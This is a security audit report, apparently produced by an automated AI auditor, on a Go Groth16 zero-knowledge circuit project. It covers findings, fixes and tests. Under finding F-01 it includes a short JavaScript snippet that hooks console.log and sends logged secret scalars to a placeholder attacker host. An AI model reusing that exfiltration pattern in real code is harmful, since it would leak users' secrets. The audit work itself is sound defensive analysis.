# Security Audit: snark/ (Groth16 over BLS12-381)

**Auditor**: Claude Opus 4.6 (automated)
**Date**: 2026-02-09
**Scope**: All `.go` files in `snark/` (10 files, ~4,000 LOC)
**gnark version**: v0.14.0 | **gnark-crypto**: v0.19.2 | **Curve**: BLS12-381
**Protocol**: Groth16 with Pedersen commitment extension (bsb22)

---

## 1. High-Level Overview

### 1.1 Circuits

The codebase defines **two circuits**, both compiled over BLS12-381's scalar field (Fr):

#### Circuit A: `wFromHKCircuit` (kappa.go:258-346)

**Statement**: "I know a scalar `hk` such that `SHA256(compress([hk]G1)) == HW0||HW1`"

| Role | Field | Type | Description |
|------|-------|------|-------------|
| Secret | `HK` | emulated Fr | Scalar derived from pairing |
| Secret | `SignHint` | native bool | Y-coordinate lexicographic sign for compression |
| Public | `HW0` | native | Upper 16 bytes of SHA256 digest |
| Public | `HW1` | native | Lower 16 bytes of SHA256 digest |

**Constraint flow**:
1. `W = [hk]G1` (emulated scalar mul base)
2. Compress W to 48 bytes (X coordinate + flags)
3. `digest = SHA256(compressed)` (in-circuit SHA256)
4. Assert `digest == HW0 || HW1` (byte-by-byte equality)

#### Circuit B: `vw0w1Circuit` (kappa.go:541-719)

**Statement**: "I know scalars `(a, r)` such that: `w0 == [MiMC(e([a]G, H0) || tag)]G` and `w1 == [a]G + [r]V`"

| Role | Field | Type | Description |
|------|-------|------|-------------|
| Secret | `A` | emulated Fr | Primary secret scalar |
| Secret | `R` | emulated Fr | Blinding scalar |
| Public | `VX, VY` | emulated Fp | Affine coords of public point V |
| Public | `W0X, W0Y` | emulated Fp | Affine coords of commitment point W0 |
| Public | `W1X, W1Y` | emulated Fp | Affine coords of blinded point W1 |

**Constraint flow**:
1. `qa = [a]G1` (emulated scalar mul base)
2. `kappa = e(qa, H0)` (in-circuit BLS12-381 pairing, ~1M constraints)
3. `elements = fq12ToNativeFr(kappa)` (12 Fp coefficients → 12 native Fr via limb arithmetic)
4. `hk = MiMC(elements || domainTag)` (standard gnark MiMC, 220 rounds)
5. `p0 = [hk]G1`; assert `p0 == W0`
6. `rv = [r]V`; `p1 = qa + rv`; assert `p1 == W1`

### 1.2 Off-Circuit Functions

| Function | Purpose |
|----------|---------|
| `gtToHash(a)` | Compute `hk = MiMC(e([a]G, H0) || tag)` natively |
| `hkScalarFromA(a)` | Same as above, returns `*big.Int` |
| `DecryptToHash(...)` | Hop key derivation: `MiMC(e(g1b,H0) * e(r1,g2b) / e(r1,shared) || tag)` |
| `ProveAndVerifyVW0W1(...)` | Fresh compile → setup → prove → verify → export |
| `ProveVW0W1FromSetup(...)` | Load setup files → prove → export (production path) |
| `SetupVW0W1Circuit(...)` | One-time trusted setup |

### 1.3 Deployment Surfaces

- **CLI binary** (`main.go`): `setup`, `hash`, `decrypt`, `prove`, `verify`, `re-export`
- **WASM module** (`wasm_main.go`): Browser-based proving via `gnarkLoadSetup`, `gnarkProve`, `gnarkGtToHash`, `gnarkDecryptToHash`
- **On-chain verifier** (Aiken contracts, out of scope): Consumes exported JSON artifacts

---

## 2. Findings Table

| ID | Severity | Title | Location | Status |
|----|----------|-------|----------|--------|
| F-01 | **HIGH** | WASM logs secret scalars to browser console | wasm_main.go:123,129,158,416-417,503 | Will remove in production |
| F-02 | **MEDIUM** | No in-circuit on-curve validation for V, W0, W1 | kappa.go:660-662 | Accepted risk (WASM 4GB limit; contract checks on-curve) |
| F-03 | **MEDIUM** | WASM hardcodes committed indices [1..36] | wasm_main.go:308-319 | Accepted (on-chain failure is acceptable) |
| F-04 | **LOW** | `r = 0` accepted, eliminating blinding | kappa.go:741-742, 911-912 | Accepted (user's responsibility for randomness) |
| F-05 | **LOW** | Minimal MiMC domain separation | kappa.go:39 | Accepted (tag exists and is used; others may reuse) |
| F-06 | **LOW** | `secret.hash` committed to repository | snark/secret.hash | Will remove (old test artifact) |
| F-07 | **INFO** | Debug CLI commands in production builds | main.go:228-234 | Will remove in production |
| F-08 | **INFO** | `domainTagFr()` suppresses hex decode error | kappa.go:166 | Acknowledged |
| F-09 | **INFO** | No integrity check on exported JSON artifacts | export.go | Accepted (export-only; contract re-verifies) |
| F-10 | **INFO** | gnark emulated ScalarMul fails for a=1, a=r-1, r=0 | gnark v0.14 limitation | Documented |

---

## 3. Detailed Findings

### F-01: WASM Logs Secret Scalars to Browser Console [HIGH]

**Location**: `wasm_main.go` lines 123, 129, 158, 416, 417, 503

**Description**: The WASM prover logs the raw secret values `a` and `r` to the browser console via `fmt.Printf`. In a WASM/JS environment, `fmt.Printf` output goes to `console.log`, which is readable by:
- Any JavaScript running on the same page (including third-party scripts, analytics, ads)
- Browser extensions with content script permissions
- Browser DevTools (if left open)

**Affected code**:
```go
// wasm_main.go:123
fmt.Printf("[WASM] wasmProve: parsed a = %s\n", a.String())
// wasm_main.go:129
fmt.Printf("[WASM] wasmProve: parsed r = %s\n", r.String())
// wasm_main.go:158
fmt.Printf("[WASM] wasmProve: reduced a = %s, r = %s\n", aRed.String(), rRed.String())
// wasm_main.go:416
fmt.Printf("[WASM]   secretA: %s\n", secretA)
// wasm_main.go:417
fmt.Printf("[WASM]   secretR: %s\n", secretR)
// wasm_main.go:503
fmt.Printf("[WASM] gnarkGtToHash: parsing a = %s\n", aStr)
```

**Exploitation**: An attacker hosting or injecting JS on the same origin can hook `console.log` before the WASM module runs:
```js
const origLog = console.log;
console.log = (...args) => {
  const msg = args.join(' ');
  if (msg.includes('secretA') || msg.includes('parsed a'))
    fetch('https://evil.com/exfil', {method:'POST', body: msg});
  origLog(...args);
};
```

**Fix**: Remove all `fmt.Printf` calls that print secret values, or gate them behind a `DEBUG` build tag. Replace with non-sensitive progress indicators:
```go
fmt.Println("[WASM] wasmProve: secrets parsed successfully")
```

---

### F-02: No In-Circuit On-Curve Validation for Public Points [MEDIUM]

**Location**: `kappa.go:656-662`

**Description**: The public G1 points V, W0, W1 are constructed from raw Fp coordinates without any in-circuit assertion that they lie on the BLS12-381 curve. The code comments state this is delegated to the on-chain contract:

```go
// NOTE: On-curve validation for v, w0, w1 is performed by the contract
// before these public inputs reach the prover. Skipping in-circuit
// validation saves ~150K constraints.
```

**Risk**: If the contract fails to validate (bug, upgrade, misconfiguration), a malicious prover could submit crafted coordinates that are NOT on the curve. With off-curve points, the emulated scalar multiplication and point addition produce undefined results, potentially allowing forged proofs.

**Mitigating factors**:
- BLS12-381 G1 has cofactor 1 (no subgroup issues)
- gnark-crypto's `SetBytes` for compressed points performs on-curve + subgroup checks, so the prover's own input parsing validates points
- The attack requires the on-chain contract to also accept invalid points

**Assessment**: This is an intentional design tradeoff (saving ~150K constraints) with a clear trust boundary. The risk materializes only if the contract verification is also flawed. **Document this trust assumption prominently.**

**Fix options**:
1. **(Recommended)** No code change; add a `SECURITY.md` documenting this trust boundary
2. (Alternative) Add in-circuit `AssertIsOnCurve` for V only (W0/W1 are checked via equality with computed points)

---

### F-03: WASM Hardcodes Committed Indices [MEDIUM]

**Location**: `wasm_main.go:259-319` (`computeCommitmentWireNoVK`)

**Description**: The WASM path computes the commitment wire without loading the VK (to avoid ~99 minutes of VK deserialization). It hardcodes the assumption that ALL public inputs (indices 1..N) are committed:

```go
// All 36 public inputs are committed (indices 1-36, 1-based).
// This is a fixed property of the vw0w1Circuit.
for i := 0; i < len(pubFr); i++ {
    frBytes := pubFr[i].Marshal()
    prehash = append(prehash, frBytes...)
}
```

**Risk**: If the circuit is modified (e.g., adding/removing public inputs, changing which inputs are committed), the WASM path silently produces incorrect commitment wires. Proofs would verify in WASM's gnark but fail on-chain.

**Fix**: Add an assertion at the top of `computeCommitmentWireNoVK`:
```go
const expectedPublicInputs = 36
if len(pubFr) != expectedPublicInputs {
    return "", fmt.Errorf("circuit changed: expected %d public inputs, got %d", expectedPublicInputs, len(pubFr))
}
```

---

### F-04: `r = 0` Accepted, Eliminating Blinding [LOW]

**Location**: `kappa.go:741-742`, `kappa.go:911-912`

**Description**: The secret scalar `r` is allowed to be 0 (or nil, which defaults to 0):
```go
if r == nil {
    r = new(big.Int)
}
```
When `r = 0`, the constraint `w1 = [a]G + [r]V` simplifies to `w1 = [a]G`, making w1 fully determined by `a` alone. The blinding factor provides no privacy in this case.

**Assessment**: This is a protocol-level concern. The circuit is mathematically correct for `r = 0`; it just provides weaker privacy guarantees. If the protocol requires blinding, it should enforce `r != 0` at the application layer.

**Fix**: Either reject `r = 0` at the prover:
```go
if r == nil || r.Sign() == 0 {
    return fmt.Errorf("r must be > 0 for privacy")
}
```
Or document that `r = 0` is intentionally allowed for certain use cases.

---

### F-05: Minimal MiMC Domain Separation [LOW]

**Location**: `kappa.go:39`

**Description**: The domain tag `"F12|To|Hex|v1|"` (14 bytes) is appended as the 13th MiMC input element. While this prevents trivial collisions with other 12-element MiMC uses, the tag:
- Does not include a circuit identifier
- Does not include the curve or field parameters
- Has no version rotation mechanism

**Risk**: If another protocol component uses MiMC with 13 Fr elements where the 13th happens to collide with this domain tag, a cross-protocol attack could be possible. This is unlikely but violates best practices for domain separation.

**Fix**: Use a more descriptive tag, e.g.:
```
"peace-protocol|vw0w1|BLS12-381|MiMC-Fr|kappa-to-hk|v1"
```
Note: Changing the tag requires regenerating all proofs and updating the on-chain verifier.

---

### F-06: `secret.hash` Committed to Repository [LOW]

**Location**: `snark/secret.hash`

**Description**: A file containing a 56-character hex string (28 bytes, consistent with SHA-224 output) is tracked in git. If this is derived from a production secret, it could serve as an oracle for brute-force attacks against short secrets.

**Fix**: If this is a test artifact, rename to `test_secret.hash` and document its purpose. If it relates to production secrets, add to `.gitignore` and rotate the secret.

---

### F-07: Debug CLI Commands in Production Builds [INFO]

**Location**: `main.go:228-234`

**Description**: The `debug-verify` and `test-verify` commands are available in the production binary. They expose diagnostic information about the verification equation and internal VK structure.

**Fix**: Gate behind a `//go:build debug` tag or remove from production builds.

---

### F-08: Silent Error Suppression in `domainTagFr()` [INFO]

**Location**: `kappa.go:166`

```go
tagBytes, _ := hex.DecodeString(DomainTagHex)
```

The error from `hex.DecodeString` is silently discarded. Since `DomainTagHex` is a compile-time constant with valid hex, this cannot fail at runtime. However, it sets a bad pattern.

**Fix**: Add an `init()` assertion:
```go
func init() {
    if _, err := hex.DecodeString(DomainTagHex); err != nil {
        panic("invalid DomainTagHex: " + err.Error())
    }
}
```

---

### F-09: No Integrity Check on Exported JSON [INFO]

**Location**: `export.go`

**Description**: The exported `vk.json`, `proof.json`, and `public.json` files have no signatures or integrity protection. An attacker with file system access could modify them.

**Mitigating factors**: The `.bin` files provide ground truth and are used for `verify` command. JSON files are primarily for on-chain submission where the contract performs its own verification.

**Fix**: No action required if the contract re-verifies. Document that JSON files are for transport only.

---

### F-10: gnark Emulated ScalarMul Fails for Boundary Scalars [INFO]

**Location**: gnark v0.14 `sw_emulated.Curve.ScalarMulBase` / `ScalarMul`

**Description**: During adversarial testing, the following boundary witness values fail during proof generation:

| Value | Error | Root Cause |
|-------|-------|------------|
| `a = 1` | `no modular inverse` | `[1]G = G` coincides with window table entry in ScalarMulBase |
| `a = r-1` | `no modular inverse` | `[r-1]G = -G` coincides with negated table entry |
| `r = 0` | constraint not satisfied | `[0]V = O` (identity) not representable in affine coordinates |

**Assessment**: These are gnark implementation limitations in the emulated curve arithmetic, not circuit soundness issues. The mathematical constraints are correct — gnark's solver simply cannot construct a valid witness assignment for these specific edge cases due to its use of incomplete addition formulas and affine representation.

**Impact**: Minimal. In practice, `a` is a large random scalar (not 1 or r-1), and `r` must be nonzero for privacy. The prover will return a clear error rather than producing an invalid proof. Off-chain code should ensure `a >= 2` and `r >= 1`.

**Fix**: No circuit change needed. Document in the off-chain code that `a` must be `>= 2` and `r` must be `>= 1`. Alternatively, upgrade to a future gnark version with complete addition formulas.

---

## 4. Soundness Analysis

### 4.1 Constraint Completeness

**`vw0w1Circuit`**: Every intermediate value is derived in-circuit from secrets `(A, R)` and public inputs, then constrained via `AssertIsEqual`:

| Variable | How Derived | Constrained By |
|----------|------------|----------------|
| `qa` | `ScalarMulBase(&c.A)` | Used in pairing + equality check for w1 |
| `kappa` | `pairing.Pair([qa], [h0])` | Feeds into MiMC hash |
| `kappaElements` | `fq12ToNativeFrElements(kappa)` | Each limb range-checked by `ReduceStrict` |
| `hk` | `hashToFrMiMC(kappaElements || tag)` | Used in scalar mul for w0 |
| `p0` | `ScalarMulBase(&hk)` | `AssertIsEqual(p0, &w0)` |
| `rv` | `ScalarMul(&v, &c.R)` | Used in addition for w1 |
| `p1` | `Add(qa, rv)` | `AssertIsEqual(p1, &w1)` |

**No unconstrained witness values detected.** The only free variables are `A` and `R`; everything else is deterministically derived and constrained.

### 4.2 No Conditional Bypass

Both circuits use only hard constraints (`AssertIsEqual`, `AssertIsBoolean`). There are no `Select`, `IsZero`, or conditional branches that could allow a "happy path" to skip validation.

### 4.3 Fp → Fr Conversion Correctness

The `fpToNativeFr` function (kappa.go:585-600) converts Fp elements to Fr using limb arithmetic:
```
x_mod_r = Σ limb[i] * (2^(64i) mod r)
```
This is correct because:
- `ReduceStrict` ensures limbs represent a canonical Fp element (< p)
- The native field IS Fr, so all arithmetic is automatically mod r
- `pow64[i]` are correctly precomputed as `2^(64i) mod r`

The conversion is lossy (p > r, so different Fp values can map to the same Fr value), but this is deterministic and consistent between prover and verifier.

### 4.4 Pairing Correctness

- `gnark-crypto` `Pair()` performs full pairing with final exponentiation (canonical GT output)
- `gnark` `sw_bls12381.Pairing.Pair()` performs optimal Ate pairing with final exponentiation in-circuit
- H0 is a compile-time constant G2 point; qa is from `ScalarMulBase` (always on G1)
- Tower decomposition order matches between `ext12.ToTower()` and manual C0.B0.A0→C1.B2.A1

### 4.5 MiMC Configuration

- gnark's standard MiMC uses 220 rounds over the BLS12-381 scalar field
- No reduced rounds or custom tweaks
- Fixed-length input (always 13 Fr elements: 12 coefficients + 1 domain tag)
- Deterministic input ordering (tower decomposition order)
- Not used as a MAC or keyed hash (no length-extension risk)

### 4.6 Groth16 Setup and Binding

- Setup uses `groth16.Setup(ccs)` with proper BLS12-381 parameters
- Pedersen commitment extension (bsb22) is active: all 36 public inputs are committed
- Commitment wire computed via `hash_to_field` with DST `"bsb22-commitment"` (gnark standard)
- Proof is bound to exact public inputs via the VK's IC vector

---

## 5. Must-Add Tests

### 5.1 Adversarial Circuit Tests

| Test | What It Catches | Priority |
|------|----------------|----------|
| Wrong W1 (valid but incorrect G1 point) | Constraint violation for w1 check | **High** |
| Wrong V (different valid G1 point, correct w0/w1 for different v) | Binding to public V | **High** |
| `a = 1` (boundary) | Edge case in scalar mul | Medium |
| `a = r - 1` (boundary, largest valid scalar) | Edge case near field order | Medium |
| `r = 1` (minimal blinding) | Correct computation at boundary | Medium |
| Same `a`, different `r` → different `w1` | Blinding works correctly | Medium |
| Different `a`, same public inputs → proof fails | Cannot forge for wrong `a` | **High** |
| Cross-check: in-circuit MiMC matches native MiMC for known GT | Hash consistency | **High** |

### 5.2 Implemented Test Cases

All of the following tests were added to `main_test.go` and pass:

| Test | Category | What It Validates |
|------|----------|-------------------|
| `TestProveAndVerifyVW0W1_FailsOnWrongW1` | Negative (circuit) | Tampered w1 (add generator) causes proof failure |
| `TestProveAndVerifyVW0W1_FailsOnWrongV` | Negative (circuit) | Wrong V with correct w0 but mismatched w1 causes proof failure |
| `TestProveAndVerifyVW0W1_FailsOnDifferentA` | Negative (circuit) | Proof with wrong secret `a` fails even with valid w0/w1 from correct `a` |
| `TestProveVW0W1_BoundaryScalars` | Boundary (circuit) | Subtests with a=2/r=2, a=3/r=200, a=100/r=100, a=999999/r=888888 |
| `TestDifferentR_DifferentW1` | Pure math | Same `a`, different `r` → different w1 (blinding works) |
| `TestSameA_SameW0` | Pure math | Same `a` always produces same w0 (determinism) |
| `TestDifferentA_DifferentW0` | Pure math | Different `a` → different w0 (no trivial collisions) |
| `TestDifferentA_DifferentHash` | Pure math | Different `a` → different MiMC hash output |
| `TestGTToHash_RejectsZeroAndNil` | Input validation | `gtToHash(0)` and `gtToHash(nil)` return errors |
| `TestHKScalarFromA_RejectsZeroAndNil` | Input validation | `hkScalarFromA(0)` and `hkScalarFromA(nil)` return errors |
| `TestDifferentVScalar_DifferentW1` | Pure math | Different V scalar → different w1 for same a,r |
| `TestDifferentVScalar_SameW0` | Pure math | Different V scalar does not affect w0 |

**Helper added**: `computeVW0W1WithVScalar(a, r, vScalar)` — allows specifying a custom V scalar for targeted testing.

**Not yet implemented** (requires WASM build infrastructure):
- `TestCommitmentWire_WASMMatchesVKPath` — verify `computeCommitmentWireNoVK` matches `computeCommitmentWire`

### 5.3 Test Coverage Assessment (Updated)

| Area | Covered | Notes |
|------|---------|-------|
| Happy path (correct proof) | Yes | - |
| Wrong W0 | Yes | - |
| Wrong W (wFromHK circuit) | Yes | - |
| Wrong W1 | Yes | Added: `TestProveAndVerifyVW0W1_FailsOnWrongW1` |
| Wrong V | Yes | Added: `TestProveAndVerifyVW0W1_FailsOnWrongV` |
| Wrong secret a | Yes | Added: `TestProveAndVerifyVW0W1_FailsOnDifferentA` |
| Boundary scalars | Yes | Added: `TestProveVW0W1_BoundaryScalars` (a=2,3,100,999999) |
| Blinding effectiveness | Yes | Added: `TestDifferentR_DifferentW1`, `TestDifferentVScalar_*` |
| w0 depends only on a | Yes | Added: `TestSameA_SameW0`, `TestDifferentA_DifferentW0` |
| Hash collision resistance | Yes | Added: `TestDifferentA_DifferentHash` |
| Input validation (a=0, nil) | Yes | Added: `TestGTToHash_RejectsZeroAndNil`, `TestHKScalarFromA_RejectsZeroAndNil` |
| Hash determinism | Yes | - |
| Parse error handling | Yes | - |
| CLI argument validation | Yes | - |
| Setup/prove workflow | Yes | - |
| gnark boundary limits (a=1,r=0) | Documented | F-10: gnark limitation, not circuit bug |
| WASM commitment wire consistency | No | Requires WASM build infrastructure |

---

## 6. Prioritized Fix Plan

### Before production deployment

1. **F-01**: Remove secret logging from WASM — owner confirms will remove
2. **F-07**: Remove debug CLI commands — owner confirms will remove
3. **F-06**: Delete `secret.hash` — owner confirms it is an old artifact

### Completed during audit

4. Adversarial test suite added (12 new tests, see section 5.2) — all passing
5. **F-10**: Boundary scalar limitations documented and tested

### Accepted risks (no action needed)

6. **F-02**: On-curve validation delegated to contract — accepted tradeoff for WASM 4GB limit
7. **F-03**: Hardcoded commitment wire indices — on-chain failure is acceptable
8. **F-04**: `r = 0` allowed — user's responsibility for randomness
9. **F-05**: Current domain tag is sufficient
10. **F-08**: Acknowledged but no change planned
11. **F-09**: JSON export is transport-only, contract re-verifies

---

## 7. Audit Verdict

### Confidence: **HIGH**

The core circuit logic is sound. Both `wFromHKCircuit` and `vw0w1Circuit` correctly enforce their mathematical relations with no unconstrained witness values, no conditional bypasses, and proper hard equality constraints. The Fp→Fr conversion, MiMC hashing, pairing computation, and point arithmetic are all implemented correctly using standard gnark primitives.

### Top Risks

1. **WASM secret leakage** (F-01): The most urgent fix. Secret scalars are printed to browser console in production WASM builds. This is a straightforward fix with no architectural implications.

2. **Trust boundary with contract** (F-02): The circuit's soundness for public inputs V/W0/W1 depends on the on-chain contract performing on-curve validation. This is a reasonable design decision but must be documented and tested end-to-end.

3. **WASM version drift** (F-03): The hardcoded commitment wire computation in WASM will silently break if the circuit changes. A simple assertion prevents this.

### What's Done Well

- Circuit constraints are complete and correct
- Pairing, MiMC, and scalar arithmetic use standard gnark library functions (no custom crypto)
- Consistent encoding between in-circuit and out-of-circuit paths (tower order, Fp→Fr, domain tag)
- Good existing test coverage for happy paths and W0 negative cases
- Clean separation between setup and prove workflows
- Proper Fr reduction of input scalars before witness creation
- Defensive `a = 0` rejection
- Pedersen commitment extension (bsb22) correctly integrated

---

## 8. Dependency Audit

| Dependency | Version | Purpose | Notes |
|------------|---------|---------|-------|
| `gnark` | v0.14.0 | Circuit compiler, Groth16 prover/verifier | Core cryptographic dependency |
| `gnark-crypto` | v0.19.2 | BLS12-381 curve, MiMC, pairing | Core cryptographic dependency |
| `golang.org/x/crypto` | v0.41.0 | SHA256 (indirect via gnark) | Standard Go crypto |
| `icicle-gnark` | v3.2.2 | GPU acceleration (indirect, unused in WASM) | Not on critical path |
| `cbor/v2` | v2.9.0 | Serialization (indirect) | — |
| `zerolog` | v1.34.0 | Logging (indirect via gnark) | — |

**Key observations**:
- gnark and gnark-crypto are maintained by Consensys (active development, regular releases)
- No known CVEs against gnark v0.14.0 or gnark-crypto v0.19.2 at time of audit
- The codebase uses no custom cryptographic implementations — all crypto operations delegate to gnark/gnark-crypto standard APIs
- Go 1.25.5 is the build target; WASM compilation uses the same toolchain

**Recommendation**: Pin dependency versions in `go.sum` (already done by Go modules). Periodically check for gnark security advisories at `github.com/Consensys/gnark/security`.

---

## 9. Owner Responses

The following responses were provided by the project owner during the audit review:

| ID | Owner Response |
|----|---------------|
| F-01 | Testing only. Will be removed before production deployment. |
| F-02 | Intentional tradeoff to fit SNARK within WASM32's 4GB limit. All points come from the smart contract which performs on-chain on-curve validation. |
| F-03 | Failing on-chain is acceptable — validation logic stops at the first step. Index check may have been removed to minimize SNARK size. |
| F-04 | Randomness of `r` is the user's responsibility. Off-chain code can validate before proof generation. |
| F-05 | Current tag is sufficient. Other contracts may reuse the same tag; adding more terms won't prevent that. The important part is that a tag exists and is used. |
| F-06 | Old file, can be removed. |
| F-07 | Testing only. Will be removed before production deployment. |
| F-08 | Acknowledged. |
| F-09 | Documenting that JSON export is for data conversion to Aiken-friendly formats is sufficient. |
| F-10 | (Documented during adversarial testing; gnark limitation, not a protocol issue.) |

---

*This audit was performed by automated analysis of all source code in `snark/`. It does not constitute a formal security certification. A manual review by a domain expert is recommended before mainnet deployment.*
